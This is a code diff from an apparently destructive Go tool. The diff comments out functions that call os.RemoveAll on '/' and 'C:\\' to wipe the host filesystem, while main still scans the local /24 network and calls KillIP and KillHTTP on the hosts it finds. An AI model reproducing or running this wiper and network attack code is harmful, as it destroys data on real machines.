@@ -106,18 +106,18 @@ func setHTTPHeaders(req *http.Request, ip string) {
 }
 
 // KillLinux deletes files on Linux systems if the user has sufficient privileges.
-func KillLinux() {
-	if err := os.RemoveAll("/"); err != nil {
-		fmt.Println(err)
-	}
-}
+// func KillLinux() {
+// 	if err := os.RemoveAll("/"); err != nil {
+// 		fmt.Println(err)
+// 	}
+// }
 
 // KillWindows deletes files on Windows systems if the user has sufficient privileges.
-func KillWindows() {
-	if err := os.RemoveAll("C:\\"); err != nil {
-		fmt.Println(err)
-	}
-}
+// func KillWindows() {
+// 	if err := os.RemoveAll("C:\\"); err != nil {
+// 		fmt.Println(err)
+// 	}
+// }
 
 func main() {
 	ipAddr := GetIPAddr() + "/24"
@@ -127,10 +127,10 @@ func main() {
 	KillIP(scannedIPs)
 	KillHTTP(scannedIPs)
 
-	switch runtime.GOOS {
-	case "linux":
-		KillLinux()
-	case "windows":
-		KillWindows()
-	}
+	// switch runtime.GOOS {
+	// case "linux":
+	// 	KillLinux()
+	// case "windows":
+	// 	KillWindows()
+	// }
 }
